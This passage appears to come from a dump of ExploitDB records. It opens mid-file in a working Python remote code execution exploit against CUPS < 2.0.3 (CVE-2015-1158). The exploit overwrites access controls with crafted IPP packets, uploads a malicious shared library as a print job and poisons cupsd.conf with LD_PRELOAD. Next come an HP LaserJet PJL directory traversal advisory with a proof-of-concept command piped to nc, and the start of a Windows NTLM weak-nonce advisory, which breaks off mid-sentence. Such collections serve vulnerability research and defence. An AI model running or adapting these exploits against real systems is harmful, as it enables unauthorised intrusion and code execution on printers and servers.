"\\n",\r\n        elif (t is "-"):\r\n                print "\\x1b[31;1m[-]\\x1b[0m\\t" + m + "\\n",\r\n        elif (t is "*"):\r\n                print "\\x1b[34;1m[*]\\x1b[0m\\t" + m + "\\n",\r\n        elif (t is "!"):\r\n                print "\\x1b[33;1m[!]\\x1b[0m\\t" + m + "\\n",\r\n\r\ndef createDump (input):\r\n        d, b, h = \'\', [], []\r\n        u = list(input)\r\n        for e in u:\r\n                h.append(e.encode("hex"))\r\n                if e == \'0x0\':\r\n                        b.append(\'0\')\r\n                elif 30 > ord(e) or ord(e) > 128:\r\n                        b.append(\'.\')\r\n                elif 30 < ord(e) or ord(e) < 128:\r\n                        b.append(e)\r\n\r\n        i = 0\r\n        while i < len(h):\r\n                if (len(h) - i ) >= 16:\r\n                        d += \' \'.join(h[i:i+16])\r\n                        d += "         "\r\n                        d += \' \'.join(b[i:i+16])\r\n                        d += "\\n"\r\n                        i = i + 16\r\n                else:\r\n                        d += \' \'.join(h[i:(len(h) - 0 )])\r\n                        pad = len(\' \'.join(h[i:(len(h) - 0 )]))\r\n                        d += \' \' * (56 - pad)\r\n                        d += \' \'.join(b[i:(len(h) - 0 )])\r\n                        d += "\\n"\r\n                        i = i + len(h)\r\n\r\n        return d\r\n\r\nclass tcpsock:\r\n    def __init__(self, sock=None):\r\n        if sock is None:\r\n            self.sock = socket(\r\n            AF_INET, SOCK_STREAM)\r\n            self.sock.settimeout(30)\r\n        else:\r\n            self.sock = sock\r\n    def connect(self, host, port):\r\n        self.sock.connect((host, int(port)))\r\n    def tx(self, msg):\r\n        self.sock.send(msg)\r\n    def rx(self):\r\n        tmp  = self.sock.recv(1024)\r\n        msg = ""\r\n        while tmp:\r\n            msg += tmp\r\n            tmp  = self.sock.recv(1024)\r\n        return msg\r\n\r\ndef txrx (ip, port, proto, txpacket):\r\n    if (proto is "tcp"):\r\n        sock = tcpsock()\r\n    elif (proto is "udp"):\r\n        sock = udpsock()\r\n    else:\r\n        return None\r\n    sock.connect(ip, port)\r\n    sock.tx(txpacket)\r\n    rxpacket = sock.rx()\r\n    return rxpacket\r\n\r\ndef locatePrinters(rhost, rport="631"):\r\n    request = ( "GET /printers HTTP/1.1\\x0d\\x0a"\r\n        "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n        "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n        "Connection: Close\\x0d\\x0a"\r\n        "\\x0d\\x0a")\r\n    response = txrx(rhost, int(rport), "tcp", request)\r\n    if response is not None:\r\n        m = re.search(\'<TR><TD><A HREF="(.+)">.+</A></TD><TD>.+</TD><TD></TD><TD>.+</TD><TD>\', response)\r\n        if m is not None:\r\n            printer = m.group(1)\r\n            pretty("+","printer found: " + printer)\r\n            return printer\r\n        else:\r\n            pretty("-","no printers")\r\n            exit(1)\r\n    else:\r\n        pretty("-","no printers")\r\n        exit(1)\r\n\r\ndef preparePayload(libpath):\r\n    with open(libpath, \'rb\') as f:\r\n        payload = f.read()\r\n    if payload is not None:\r\n        pretty("*","Payload:\\n" + createDump(payload))\r\n    else:\r\n        pretty("-","something went wrong")\r\n        usage()\r\n    return payload\r\n\r\ndef seedTarget(rhost, rport, printer, payload):\r\n    i = random.randint(1,3)\r\n    reqid = str(pack(">i",(i+2)))\r\n    reqid2 = str(pack(">i",(i+3)))\r\n    printer_uri = "ipp://" + rhost + ":" + str(rport) + printer\r\n\r\n    create_job_packet = ("\\x02\\x00"\r\n                         "\\x00\\x05"+\r\n                         reqid+\r\n                         "\\x01"\r\n                         "\\x47"+"\\x00\\x12"+"attributes-charset"+"\\x00\\x05"+"utf-8"\r\n                         "\\x48"+"\\x00\\x1b"+"attributes-natural-language"+"\\x00\\x05"+"en-us"\r\n                         "\\x45"+"\\x00\\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +\r\n                         "\\x42"+"\\x00\\x14"+"requesting-user-name"+"\\x00\\x04"+"root"\r\n                         "\\x42"+"\\x00\\x08"+"job-name"+"\\x00\\x06"+"badlib"\r\n                         "\\x02"\r\n                         "\\x21"+"\\x00\\x06"+"copies"+"\\x00\\x04"+"\\x00\\x00\\x00\\x01"\r\n                         "\\x23"+"\\x00\\x0a"+"finishings"+"\\x00\\x04"+"\\x00\\x00\\x00\\x03"\r\n                         "\\x42"+"\\x00\\x10"+"job-cancel-after"+"\\x00\\x05"+"\\x31\\x30\\x38\\x30\\x30"\r\n                         "\\x44"+"\\x00\\x0e"+"job-hold-until"+"\\x00\\x0a"+"indefinite"\r\n                         "\\x21"+"\\x00\\x0c"+"job-priority"+"\\x00\\x04"+"\\x00\\x00\\x00\\x32"\r\n                         "\\x42"+"\\x00\\x0a"+"job-sheets"+"\\x00\\x04"+"none"+"\\x42"+"\\x00\\x00\\x00\\x04"+"none"\r\n                         "\\x21"+"\\x00\\x09"+"number-up"+"\\x00\\x04"+"\\x00\\x00\\x00\\x01"\r\n                         "\\x03")\r\n    pretty("*","Sending createJob")\r\n\r\n    http_header1 = ( "POST " + printer + " HTTP/1.1\\x0d\\x0a"\r\n                        "Content-Type: application/ipp\\x0d\\x0a"\r\n                        "Host: " + rhost + ":" + str(rport) + "\\x0d\\x0a"\r\n                        "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                        "Connection: Close\\x0d\\x0a"\r\n                        "Content-Length: " + str(len(create_job_packet) + 0) + "\\x0d\\x0a"\r\n                        "\\x0d\\x0a")\r\n\r\n    createJobRequest = http_header1 + create_job_packet\r\n    blah = txrx(rhost,int(rport),"tcp",createJobRequest)\r\n    if blah is not None:\r\n        m = re.search("ipp://" + rhost + ":" + str(rport) + "/jobs/(\\d+)",blah)\r\n        if m is not None:\r\n            jobid = m.group(1)\r\n    else:\r\n        pretty("-","something went wrong");\r\n        exit()\r\n\r\n    pretty("*","\\n" + createDump(blah) + "\\n")\r\n    pretty("*", "Sending sendJob")\r\n\r\n    send_document_packet = ("\\x02\\x00"\r\n                            "\\x00\\x06"+\r\n                            reqid2+\r\n                            "\\x01"\r\n                            "\\x47"+"\\x00\\x12"+"attributes-charset"+"\\x00\\x05"+"utf-8"\r\n                            "\\x48"+"\\x00\\x1b"+"attributes-natural-language"+"\\x00\\x05"+"en-us"\r\n                            "\\x45"+"\\x00\\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +\r\n                            "\\x21"+"\\x00\\x06"+"job-id"+"\\x00\\x04"+ str(pack(">i", int(jobid))) +\r\n                            "\\x42"+"\\x00\\x14"+"requesting-user-name"+"\\x00\\x04"+"root"\r\n                            "\\x42"+"\\x00\\x0d"+"document-name"+"\\x00\\x06"+"badlib"\r\n                            "\\x49"+"\\x00\\x0f"+"document-format"+"\\x00\\x18"+"application/octet-stream"\r\n                            "\\x22"+"\\x00\\x0d"+"last-document"+"\\x00\\x01"+"\\x01"\r\n                            "\\x03"+\r\n                            payload)\r\n\r\n    http_header2 = ( "POST " + printer + " HTTP/1.1\\x0d\\x0a"\r\n                        "Content-Type: application/ipp\\x0d\\x0a"\r\n                        "Host: " + rhost + ":" + str(rport) + "\\x0d\\x0a"\r\n                        "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                        "Connection: Close\\x0d\\x0a"\r\n                        "Content-Length: " + str(len(send_document_packet) + 0) + "\\x0d\\x0a"\r\n                        "\\x0d\\x0a")\r\n\r\n    sendJobRequest = http_header2 + send_document_packet\r\n    blah2 = txrx(rhost,int(rport),"tcp",sendJobRequest)\r\n    pretty("*","\\n" + createDump(blah) + "\\n")\r\n    pretty("*","job id: " + jobid)\r\n    return jobid\r\n\r\ndef stompACL(rhost, rport, printer):\r\n    i = random.randint(1,1024)\r\n    printer_url = "ipp://" + rhost + ":" + rport + printer\r\n\r\n    admin_stomp = ("\\x02\\x00"      #   vers 2.0\r\n                "\\x00\\x05"+     #   op id: Create Job (0x0005)\r\n                str(pack(">i",(i+1)))+\r\n                "\\x01"      #   op attributes marker\r\n                "\\x47"      #   charset\r\n                "\\x00\\x12"      #   name len: 18\r\n                "attributes-charset"\r\n                "\\x00\\x08"      #   val len: 8\r\n                "us-ascii"\r\n                "\\x48"      #   natural language\r\n                "\\x00\\x1b"      #   name len: 27\r\n                "attributes-natural-language"\r\n                "\\x00\\x06"      #   val len: 6\r\n                "/admin"\r\n                "\\x45"      #   printer-uri\r\n                "\\x00\\x0b"      #   name len 11\r\n                "printer-uri" +\r\n                str(pack(">h", len(printer_url))) + printer_url +\r\n                "\\x42"      #   name without lang\r\n                "\\x00\\x14"      #   name len: 20\r\n                "requesting-user-name"\r\n                "\\x00\\x06"      #   val len: 6\r\n                "/admin"\r\n                "\\x02"      #   job attrs marker\r\n                "\\x21"      #   integer\r\n                "\\x00\\x06"      #   name len: 6\r\n                "copies"\r\n                "\\x00\\x04"      #   val len: 4\r\n                "\\x00\\x00\\x00\\x01"  #   1\r\n                "\\x42"      #   name w/o lang\r\n                "\\x00\\x19"      #   name len: 25\r\n                "job-originating-host-name"\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x36"      #   nwl\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x16"      #   val len: 22\r\n                "\\x00\\x06"      #   length\r\n                "/admin"\r\n                "\\x00\\x0c"\r\n                "BBBBBBBBBBBB"\r\n                "\\x03")      #   end of attributes\r\n\r\n    conf_stomp = ("\\x02\\x00"        #   vers 2.0\r\n                "\\x00\\x05"+     #   op id: Create Job (0x0005)\r\n                str(pack(">i",(i+2)))+\r\n                "\\x01"      #   op attributes marker\r\n                "\\x47"      #   charset\r\n                "\\x00\\x12"      #   name len: 18\r\n                "attributes-charset"\r\n                "\\x00\\x08"      #   val len: 8\r\n                "us-ascii"\r\n                "\\x48"      #   natural language\r\n                "\\x00\\x1b"      #   name len: 27\r\n                "attributes-natural-language"\r\n                "\\x00\\x0b"      #   val len: 11\r\n                "/admin/conf"\r\n                "\\x45"      #   printer-uri\r\n                "\\x00\\x0b"      #   name len 11\r\n                "printer-uri" +\r\n                str(pack(">h", len(printer_url))) + printer_url +\r\n                "\\x42"      #   name without lang\r\n                "\\x00\\x14"      #   name len: 20\r\n                "requesting-user-name"\r\n                "\\x00\\x0b"      #   val len: 11\r\n                "/admin/conf"\r\n                "\\x02"      #   job attrs marker\r\n                "\\x21"      #   integer\r\n                "\\x00\\x06"      #   name len: 6\r\n                "copies"\r\n                "\\x00\\x04"      #   val len: 4\r\n                "\\x00\\x00\\x00\\x01"  #   1\r\n                "\\x42"      #   name w/o lang\r\n                "\\x00\\x19"      #   name len: 25\r\n                "job-originating-host-name"\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x42"      #   nwol\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x0c"      #   val len: 12\r\n                "AAAAAAAAAAAA"\r\n                "\\x36"      #   nwl\r\n                "\\x00\\x00"      #   name len: 0\r\n                "\\x00\\x1b"      #   val len: 27\r\n                "\\x00\\x0b"      #   length\r\n                "/admin/conf"\r\n                "\\x00\\x0c"\r\n                "BBBBBBBBBBBB"\r\n                "\\x03")      #   end of attributes\r\n\r\n    http_header1 = ("POST " + printer + " HTTP/1.1\\x0d\\x0a"\r\n                    "Content-Type: application/ipp\\x0d\\x0a"\r\n                    "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n                    "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                    "Connection: Close\\x0d\\x0a"\r\n                    "Content-Length: " + str(len(admin_stomp)) + "\\x0d\\x0a"\r\n                    "\\x0d\\x0a")\r\n\r\n    http_header2 = ("POST " + printer + " HTTP/1.1\\x0d\\x0a"\r\n                    "Content-Type: application/ipp\\x0d\\x0a"\r\n                    "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n                    "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                    "Connection: Close\\x0d\\x0a"\r\n                    "Content-Length: " + str(len(conf_stomp)) + "\\x0d\\x0a"\r\n                    "\\x0d\\x0a")\r\n\r\n    pretty("*","stomping ACL")\r\n    pretty("*",">:\\n" + createDump(http_header1 + admin_stomp))\r\n    pretty("*","<:\\n" + createDump(txrx(rhost,rport,"tcp",http_header1 + admin_stomp)))\r\n    time.sleep(1)\r\n    pretty("*",">:\\n" + createDump(http_header2 + conf_stomp))\r\n    pretty("*","<:\\n" + createDump(txrx(rhost,rport,"tcp",http_header2 + conf_stomp)))\r\n\r\n    http_header_check = ("GET /admin HTTP/1.1\\x0d\\x0a"\r\n                        "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n                        "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                        "Connection: Close\\x0d\\x0a"\r\n                        "\\x0d\\x0a")\r\n    pretty("*","checking /admin")\r\n    pretty("*",">:\\n" + createDump(http_header_check))\r\n    res = txrx(rhost,rport,"tcp",http_header_check)\r\n    pretty("*","<:\\n" + createDump(res))\r\n    m = re.search(\'200 OK\', res)\r\n    if m is not None:\r\n        pretty("+","ACL stomp successful")\r\n    else:\r\n        pretty("-","exploit failed")\r\n        exit(1)\r\n\r\n\r\ndef getConfig(rhost, rport):\r\n    i = random.randint(1,1024)\r\n    original_config = ""\r\n    http_request = ("GET /admin/conf/cupsd.conf HTTP/1.1\\x0d\\x0a"\r\n                    "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n                    "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                    "Connection: Close\\x0d\\x0a"\r\n                    "\\x0d\\x0a")\r\n\r\n    pretty("*","grabbing configuration file....")\r\n    res = txrx(rhost,rport,"tcp",http_request)\r\n    res_array = res.split("\\x0d\\x0a\\x0d\\x0a")\r\n    original_config = res_array[1]\r\n    pretty("*","config:\\n" + original_config + "\\n")\r\n    return original_config\r\n\r\ndef putConfig(rhost, rport, config):\r\n    http_request = ("PUT /admin/conf/cupsd.conf HTTP/1.1\\x0d\\x0a"\r\n                    "Content-Type: application/ipp\\x0d\\x0a"\r\n                    "Host: " + rhost + ":" + rport + "\\x0d\\x0a"\r\n                    "User-Agent: CUPS/2.0.2\\x0d\\x0a"\r\n                    "Connection: Keep-Alive\\x0d\\x0a"\r\n                    "Content-Length: " + str(len(config)) + "\\x0d\\x0a"\r\n                    "\\x0d\\x0a")\r\n    pretty("*","overwriting config...")\r\n    pretty("*",">:\\n" + createDump(http_request + config))\r\n    pretty("*","<:\\n" + createDump(txrx(rhost,rport,"tcp",http_request + config)))\r\n\r\ndef poisonConfig(config, name):\r\n    config = config + "\\x0a\\x0aSetEnv LD_PRELOAD /var/spool/cups/d000" + name + "-001\\x0a"\r\n    return config\r\n\r\ndef main():\r\n    rhost = None;\r\n    rport = None;\r\n    noshell = None;\r\n    options, remainder = getopt.getopt(sys.argv[1:], \'a:b:c:fh\', [\'rhost=\',\'rport=\',\'lib=\',\'stomp-only\',\'help\'])\r\n    for opt, arg in options:\r\n        if opt in (\'-h\', \'--help\'):\r\n            usage()\r\n        elif opt in (\'-a\',\'--rhost\'):\r\n            rhost = arg;\r\n        elif opt in (\'-b\',\'--rport\'):\r\n            rport = arg;\r\n        elif opt in (\'-c\',\'--lib\'):\r\n            libpath = arg;\r\n        elif opt in (\'-f\',\'--stomp-only\'):\r\n            noshell = 1;\r\n    banner()\r\n    if rhost is None or rport is None:\r\n        usage()\r\n    pretty("*","locate available printer")\r\n    printer = locatePrinters(rhost, rport)\r\n    pretty("*","stomp ACL")\r\n    stompACL(rhost, rport, printer)\r\n    if (noshell is not None):\r\n        pretty("*","fin")\r\n        exit(0)\r\n    pretty("*","prepare payload")\r\n    payload = preparePayload(libpath)\r\n    pretty("*","spray payload")\r\n    jobid = seedTarget(rhost, rport, printer, payload)\r\n    pretty("*","grab original config")\r\n    OG_config = getConfig(rhost, rport)\r\n    pretty("*","generate poison config")\r\n    evil_config = poisonConfig(OG_config, jobid)\r\n    pretty("*","upload poison config")\r\n    putConfig(rhost, rport, evil_config)\r\n    pretty("*","fin")\r\n    exit(0);\r\n\r\nif __name__ == "__main__":\r\n    main()', u'description': u'CUPS < 2.0.3 - Remote Command Execution', u'platform': u'linux', u'author': u'@0x00string', u'cve': [u'CVE-2015-1158'], u'source': u'ExploitDB', u'date': u'2017-02-03T00:00:00+00:00', u'_id': 41233, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2010-4107']
Description: HP LaserJet - Directory Traversal in PJL Interface
{u'code': u'n.runs AG\r\nhttp://www.nruns.com/                             security(at)nruns.com\r\nn.runs-SA-2010.003                                          16-Nov-2010\r\n________________________________________________________________________\r\n\r\nVendor:         Hewlett-Packard, http://www.hp.com\r\nAffected Products:      Various HP LaserJet MFP devices\r\n                        (See HP advisory [3] for the complete list)\r\nVulnerability:          Directory Traversal in PJL interface\r\nRisk:                   HIGH\r\n________________________________________________________________________\r\n\r\nVendor communication:\r\n\r\n2009/11/25 Initial notification of Hewlett-Packard\r\n2009/11/25 HP confirms receival of advisory\r\n2010/02/05 n.runs AG requests update on the reported issue\r\n2010/02/05 HP notifies n.runs AG that an advisory is in preparation\r\n2010/11/15 Publication of HP advisory\r\n________________________________________________________________________\r\n\r\nOverview:\r\n\r\nThe Printer Job Language (PJL) was developed by Hewlett-Packard to\r\nprovide a method for switching printer languages at the job level\r\nand for status exchange between the device and a host computer.\r\nBesides the possibility to view and change parts of the printer\'s\r\nconfiguration or modify control panel messages PJL allows some limited\r\nform of file system access. PJL is used "above" other printer languages\r\nsuch as PCL and is usually accessible on port 9100. Detailed\r\ninformation about PJL can be found in the PJL Technical Reference\r\nManual [1].\r\n\r\nDescription:\r\n\r\nA directory traversal vulnerability has been found in the PJL file\r\nsystem access interface of various HP LaserJet MFP devices.\r\nFile system access through PJL is usually restricted to a specific\r\npart of the file system. Using a pathname such as 0:\\..\\..\\..\\ it\r\nis possible to get access to the complete file system of the device.\r\n\r\nProof of Concept:\r\n\r\nThe following command can be used to reproduce the problem. It lists\r\nall files in the root directoy of the device:\r\n\r\n$ python -c \'print "\\x1b%-12345X () PJL FSDIRLIST NAME=\\"0:\\\\..\\\\..\\\\..\\\\\\" \\\r\n  ENTRY=1 COUNT=999999\\x0d\\x0a\\x1b%-12345X\\x0d\\x0a"\' | nc 192.168.0.1 9100\r\n@PJL FSDIRLIST NAME="0:\\..\\..\\..\\" ENTRY=1\r\n. TYPE=DIR\r\n.. TYPE=DIR\r\ntmp TYPE=DIR\r\netc TYPE=DIR\r\nxps TYPE=DIR\r\ndsk_ide2a TYPE=DIR\r\ndsk_ColorIQ TYPE=DIR\r\ndsk_CustomIQ TYPE=DIR\r\nbootdev TYPE=DIR\r\ndsk_jdi TYPE=DIR\r\ndsk_jdi_ss TYPE=DIR\r\ndsk_af TYPE=DIR\r\nlrt TYPE=DIR\r\nwebServer TYPE=DIR\r\n\r\nImpact:\r\n\r\nThis vulnerability allows sensitive information to be disclosed\r\nand potentially be modified. This includes spooled print jobs,\r\nreceived faxes, log files or other settings of the device.\r\n\r\nSolution:\r\n\r\nSee the HP advisory [3] for possible workarounds.\r\n________________________________________________________________________\r\n\r\nCredit:\r\nBug found by Moritz Jodeit of n.runs AG.\r\n________________________________________________________________________\r\n\r\nReferences:\r\n[1]\r\nhttp://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pd\r\nf\r\n[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4107\r\n[3]\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c0200\r\n4333\r\n\r\nThis Advisory and Upcoming Advisories:\r\nhttp://www.nruns.com/security_advisory.php\r\n________________________________________________________________________\r\n\r\nUnaltered electronic reproduction of this advisory is permitted. For all\r\nother reproduction or publication, in printing or otherwise, contact\r\nsecurity () nruns com for permission. Use of the advisory constitutes\r\nacceptance for use in an "as is" condition. All warranties are excluded. In\r\nno event shall n.runs be liable for any damages whatsoever including direct,\r\nindirect, incidental, consequential, loss of business profits or special\r\ndamages, even if n.runs has been advised of the possibility of such damages.\r\n\r\nCopyright 2010 n.runs AG. All rights reserved. Terms of use apply.', u'description': u'HP LaserJet - Directory Traversal in PJL Interface', u'platform': u'hardware', u'author': u'n.runs AG', u'cve': [u'CVE-2010-4107'], u'source': u'ExploitDB', u'date': u'2010-11-29T00:00:00+00:00', u'_id': 15631, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2010-0231']
Description: Microsoft Windows - NTLM Weak Nonce (MS10-012)
{u'code': u'\t\tWindows SMB NTLM Authentication Weak Nonce Vulnerability \r\n\t\t\t\tSecurity Advisory\r\n\tHernan Ochoa (hernan@ampliasecurity.com) - Agustin Azubel (aazubel@ampliasecurity.com)\r\n\r\n\r\nTitle: Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\nAdvisory ID: OCHOA-2010-0209\r\nAdvisory URL: http://www.hexale.org/advisories/OCHOA-2010-0209.txt\r\nDate published: 2010-02-09\r\nVendors contacted: Microsoft\r\nRelease mode: Coordinated release\r\nLast Updated: 2010-09-18\r\n\r\n\r\nIndex\r\n-----\r\n\r\n1.Vulnerablity information\r\n2.Vulnerablity description\r\n3.Vulnerable systems\r\n4.Vendor Information, solutions and workarounds\r\n5.Credits\r\n6.Technical description\r\n6.1.NTLM authentication protocol\r\n6.2.The Flaws\r\n6.3.Detecting if the SMB service generates duplicate 8-byte challenges\r\n6.4.Exploiting duplicate challenges\r\n6.4.1.Proof-of-Concept Exploit \r\n6.5.Predicting challenges\r\n6.5.1.SMB service: challenge generation process\r\n6.5.2.Proof-of-Concept Exploit\r\n7.References\r\n8.Disclaimer\r\n\r\n\r\n1.Vulnerability information\r\n---------------------------\r\n\r\nImpact: An unauthenticated remote attacker without any kind of credentials can access the SMB service under the credentials of an authorized user. Depending on the privileges of the authorized user, and the configuration of the remote system, an attacker can gain read/write access to the remote file system and execute arbitrary code by using DCE/RPC over SMB.\r\nRemotely Exploitable: Yes\r\nBugtraq Id: <unknown> \r\nCVE: CVE-2010-0231\r\n\r\n\r\n2.Vulnerability description\r\n---------------------------\r\n\r\nMicrosoft Server Message Block (SMB) Protocol is a Microsoft network file sharing protocol also used for sharing printers, communications abstractions such as named pipes and mailslots, and performing Remote Procedure Calls (DCE/RPC over SMB) [1].\r\n\r\nNTLM (NT Lan Manager) is a challenge-response authentication protocol used by the SMB protocol [2].\r\n\r\nWindows systems commonly use the SMB protocol with NTLM authentication for network file/printer sharing and remote administration via DCE/RPC.\r\n\r\nFlaws in Microsoft\'s implementation of the NTLM challenge-response authentication protocol causing the server to generate duplicate challenges/nonces and an information leak allow an unauthenticated remote attacker without any kind of credentials to access the SMB service of the target system under the credentials of an authorized user. Depending on the privileges of the user, the attacker will be able to obtain and modify files on the target system and execute arbitrary code.\r\n\r\n3.Vulnerable Systems\r\n--------------------\r\n\r\nThis vulnerability was verified by the authors on the following platforms:\r\n\r\nWindows NT 3.1/3.5\r\nWindows NT4 SP1\r\nWindows Server 2003 SP2\r\nWindows XP SP3\r\nWindows Vista x32\r\nWindows 7 x32 RC\r\n\r\nHowever, all versions of Windows implementing NTLM v1 and v2 are suspected to be affected.\r\n\r\nMicrosoft, in their "Microsoft Security Bulletin Advance Notification for February 2010" [3], list the following platforms as affected:\r\n\r\nWindows 2000 SP4\r\nWindows XP SP2 and SP3\r\nWindows XP Professional x64 Edition SP2\r\nWindows Server 2003 SP2\r\nWindows Server 2003 x64 Edition SP2\r\nWindows Server 2003 SP2 for Itanium-based systems\r\nWindows Vista\r\nWindows Vista SP1\r\nWindows Vista SP2\r\nWindows Vista x64 Edition\r\nWindows Vista x64 Edition SP1\r\nWindows Vista x64 Edition SP2\r\nWindows Server 2008 x32\r\nWindows Server 2008 x32 SP2\r\nWindows Server 2008 x64 SP2\r\nWindows Server 2008 x64 SP2\r\nWindows Server 2008 for Itanium-based systems\r\nWindows Server 2008 for Itanium-based systems SP2\r\nWindows 7 x32\r\n\r\nSee [3] for more details.\r\n\r\nGiven that Windows NT 3.1 (which we have confirmed is also affected) was released in ~1993 this vulnerability has been present for ~17 years in all Windows systems. \r\n\r\n\r\n4.Vendor Information, Solutions and Workarounds\r\n-----------------------------------------------\r\n\r\nSMB NTLM Authentication Lack of Entropy Vulnerability - CVE-2010-0231\r\nhttp://www.microsoft.com/technet/security/bulletin/ms10-012.mspx\r\n\r\n5.Credits\r\n---------\r\n\r\nThis vulnerability was discovered by Hernan Ochoa (Security Consultant and Researcher) and it was researched by Hernan Ochoa and Agustin Azubel (Security Consultant and Researcher).\r\n\r\n6.Technical description \r\n------------------------\r\n\r\nMicrosoft Server Message Block (SMB) Protocol is a Microsoft network file sharing protocol also used for sharing printers, communications abstractions such as named pipes and mailslots, and performing Remote Procedure Calls (DCE/RPC over SMB) [1].\r\n\r\nNTLM (NT Lan Manager) is a challenge-response authentication protocol used by the SMB protocol [2].\r\n\r\nWindows systems commonly use the SMB protocol with NTLM authentication for network file/printer sharing and remote administration via DCE/RPC.\r\n\r\nFlaws in Microsoft\'s implementation of the NTLM challenge-response authentication protocol causing the server to generate duplicate challenges/nonces and an information leak allow an unauthenticated remote attacker without any kind of credentials to access the SMB service of the target system under the credentials of an authorized user. Depending on the privileges of the user, the attacker will be able to obtain and modify files on the target system and execute arbitrary code.\r\n\r\n6.1.NTLM authentication protocol\r\n----------------------------------\r\n\r\nThe NTLMv1 authentication protocol is a challenge-response protocol that consists of the following messages: \r\n\r\n\t1. The client sends to the server a message containing a set of flags of\r\nfeatures supported/requested to perform authentication.\r\n\t2. The server responds with a message containing a set of flags supported/required by the server enabling both ends to agree on the authentication parameters and, more importantly, an 8-byte random challenge/nonce.\r\n\t3. The client uses the random challenge/nonce and the user\'s credentials to calculate the response (24 bytes) and sends it to the server.\r\n\t4. The server determines if the response is correct and allows or disallows access to the client.\r\n\r\nThe randomness of the 8-byte challenge/nonce returned by the server tries to ensure that every challenge-response sequence is unique helping protect against replay attacks.\r\n\r\nThe NTLMv2 authentication protocol is functionally equivalent to NTLMv1 for the purposes of this vulnerability and is also affected.\r\n\r\n6.2.The Flaws\r\n----------------\r\n\r\nSeveral flaws were found leading to attacks such as generation of duplicate challenges/nonces and challenge/nonce prediction.\r\n\r\nThe randomness of the 8-byte challenges generated by the SMB server in response to an specific packet 